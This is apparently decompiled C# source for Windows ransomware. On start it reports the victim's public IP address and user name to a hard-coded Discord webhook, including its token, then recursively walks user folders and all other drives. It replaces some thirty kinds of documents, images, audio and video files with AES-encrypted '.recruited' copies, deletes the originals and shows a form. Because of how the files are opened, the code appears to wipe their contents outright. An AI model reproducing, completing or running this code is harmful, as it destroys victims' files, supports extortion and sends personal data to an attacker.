using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.Windows.Forms;

internal class Class0
{
	[CompilerGenerated]
	private sealed class Class1
	{
		public string string_0;

		internal void method_0()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_1()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_2()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_3()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_4()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_5()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_6()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_7()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_8()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_9()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_10()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_11()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_12()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_13()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_14()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_15()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_16()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_17()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_18()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_19()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_20()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_21()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_22()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_23()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_24()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_25()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_26()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_27()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_28()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_29()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_30()
		{
			smethod_2(string_0, Class0.string_0);
		}
	}

	private static string string_0 = "foaweijfoawe";

	private static void Main(string[] args)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0078: Expected O, but got Unknown
		//IL_00f6: Unknown result type (might be due to invalid IL or missing references)
		Task<string> task = null;
		HttpClient val = new HttpClient();
		try
		{
			task = val.GetAsync("https://api.ipify.org").Result.get_Content().ReadAsStringAsync();
		}
		catch
		{
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		HttpClient val2 = new HttpClient();
		Dictionary<string, string> dictionary = new Dictionary<string, string>
		{
			{
				"content",
				"------------------------------------\ninfected!\nos:windows\nip:" + task.Result
			},
			{
				"username",
				Environment.UserName
			}
		};
		val2.PostAsync("https://discord.com/api/webhooks/867659732009746492/cut3G4XUcqCb9fvlz594HRE4itAl4IViIQ9kOz-LZKLwpqDw_L4vZqTJHqEqVrG1PqiS", (HttpContent)new FormUrlEncodedContent((IEnumerable<KeyValuePair<string, string>>)dictionary)).GetAwaiter().GetResult();
		smethod_1("C:\\Users", smethod_0);
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (!driveInfo.Name.Contains("C:") && driveInfo.IsReady)
			{
				smethod_1(driveInfo.Name, smethod_0);
			}
		}
		((Form)new Form1()).ShowDialog();
	}

	private static void smethod_0(string string_1)
	{
		if (Path.GetFileName(string_1) == "jihou.mp3")
		{
			return;
		}
		try
		{
			string extension = Path.GetExtension(string_1);
			switch (Class3.smethod_0(extension))
			{
			case 175576948u:
				if (extension == ".bmp")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 94991972u:
				if (extension == ".accdb")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 71852739u:
				if (extension == ".txt")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 475261704u:
				if (extension == ".mp4")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 469959950u:
				if (extension == ".xlsx")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 826795865u:
				if (extension == ".pict")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 592705037u:
				if (extension == ".mp3")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 1384894805u:
				if (extension == ".gif")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 1128223456u:
				if (extension == ".png")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 1605963464u:
				if (extension == ".webm")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 1388056268u:
				if (extension == ".jpg")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 1767085374u:
				if (extension == ".docs")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 1680899145u:
				if (extension == ".pdf")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 1932828157u:
				if (extension == ".pptx")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 1782720565u:
				if (extension == ".eps")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 2467493240u:
				if (extension == ".wave")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 1934861564u:
				if (extension == ".docm")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 2685385760u:
				if (extension == ".aac")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 2651941483u:
				if (extension == ".csv")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 3115564298u:
				if (extension == ".odt")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 2981397527u:
				if (extension == ".flac")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 3238515961u:
				if (extension == ".doc")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 3211133207u:
				if (extension == ".flv")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 3478352337u:
				if (extension == ".mpg")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 3388221377u:
				if (extension == ".avi")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 3560597182u:
				if (extension == ".tiff")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 3498925813u:
				if (extension == ".mov")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 3767956097u:
				if (extension == ".mkv")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 3575879495u:
				if (extension == ".aif")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 4178554255u:
				if (extension == ".jpeg")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 4100894060u:
				if (extension == ".tif")
				{
					Task.Run(delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			}
		}
		catch
		{
		}
	}

	private static void smethod_1(string string_1, Action<string> action_0)
	{
		string[] files = Directory.GetFiles(string_1);
		foreach (string obj in files)
		{
			action_0(obj);
		}
		files = Directory.GetDirectories(string_1);
		foreach (string string_2 in files)
		{
			try
			{
				smethod_1(string_2, action_0);
			}
			catch
			{
			}
		}
	}

	private static bool smethod_2(string string_1, string string_2)
	{
		byte[] buffer = new byte[4096];
		using (FileStream fileStream = new FileStream(Path.Combine(Path.GetDirectoryName(string_1), Path.GetFileNameWithoutExtension(string_1)) + ".recruited", FileMode.Create, FileAccess.Write))
		{
			using AesManaged aesManaged = new AesManaged();
			aesManaged.BlockSize = 128;
			aesManaged.KeySize = 128;
			aesManaged.Mode = CipherMode.CBC;
			aesManaged.Padding = PaddingMode.PKCS7;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(string_2, 16);
			byte[] array = new byte[16];
			array = rfc2898DeriveBytes.Salt;
			byte[] array2 = (aesManaged.Key = rfc2898DeriveBytes.GetBytes(16));
			aesManaged.GenerateIV();
			ICryptoTransform transform = aesManaged.CreateEncryptor(aesManaged.Key, aesManaged.IV);
			using CryptoStream stream = new CryptoStream(fileStream, transform, CryptoStreamMode.Write);
			fileStream.Write(array, 0, 16);
			fileStream.Write(aesManaged.IV, 0, 16);
			using DeflateStream deflateStream = new DeflateStream(stream, CompressionMode.Compress);
			using FileStream fileStream2 = new FileStream(string_1, FileMode.Create);
			int count;
			while ((count = fileStream2.Read(buffer, 0, 4096)) > 0)
			{
				deflateStream.Write(buffer, 0, count);
			}
		}
		File.Delete(string_1);
		Console.WriteLine(string_1 + "終わり");
		return true;
	}
}
